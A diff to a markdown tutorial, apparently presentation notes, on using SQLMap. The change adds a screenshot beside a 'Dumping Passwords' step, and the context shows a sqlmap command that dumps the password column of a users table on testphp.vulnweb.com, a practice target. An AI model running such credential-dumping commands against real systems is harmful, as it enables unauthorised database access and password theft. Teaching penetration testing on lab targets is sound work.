@@ -77,6 +77,9 @@ SQLMap is an open-source penetration testing tool used to detect and exploit SQL
 
 **Dumping Passwords**
 
+<img width="1920" height="1200" alt="2025-09-06 09_28_27-Greenshot-4" src="https://github.com/user-attachments/assets/bde1102e-3ba7-4197-8027-8f98742da303" />
+
+
 `sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C pass --dump`
 
 -D → select a specific database.
@@ -92,6 +95,7 @@ SQLMap is an open-source penetration testing tool used to detect and exploit SQL
 👉 Extracted passwords from the users table.
 
 👉 Example result: pass → test.
+
 
 **🔑 Key Notes (for your last slide)**
 
